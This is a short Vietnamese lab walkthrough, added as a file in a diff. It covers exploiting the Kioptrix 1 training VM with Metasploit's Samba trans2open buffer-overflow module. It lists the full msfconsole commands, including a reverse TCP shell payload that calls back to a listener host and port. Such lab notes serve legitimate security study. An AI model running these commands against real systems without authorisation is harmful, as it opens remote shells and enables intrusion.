@@ -1,0 +1,27 @@
+Sử dụng metasploit để khai thác máy chủ Kioptrix_1
+
+Khởi động DB của metasploit với 1 trong 3 câu lệnh sau:
+
+#/etc/init.d/postgresql start
+or
+#service postgresql start
+or
+#systemctl start postgresql
+
+msfconsole -q 
+thuộc tính -q sẽ cho phép chạy msfconsole chạy mà ko load banner và gọn gàng hơn.
+
+Tìm kiếm lỗ hổng trans2open (phần này nằm trong Mod enum samba 2.2.1a và đã tìm trên exploit-db tên lỗ hổng BOF này)
+
+msf> search trans2open
+
+msf> use exploit/linux/samba/trans2open
+msf> set payload generic/shell_reverse_tcp
+msf> set RHOSTS 192.168.27.163
+msf> set LHOST 192.168.27.160
+msf> set LPORT 4444
+msf> exploit
+
+Phương thức khai thác ở đây là Brute-force từng offset với kỹ thuật BOF.
+
+
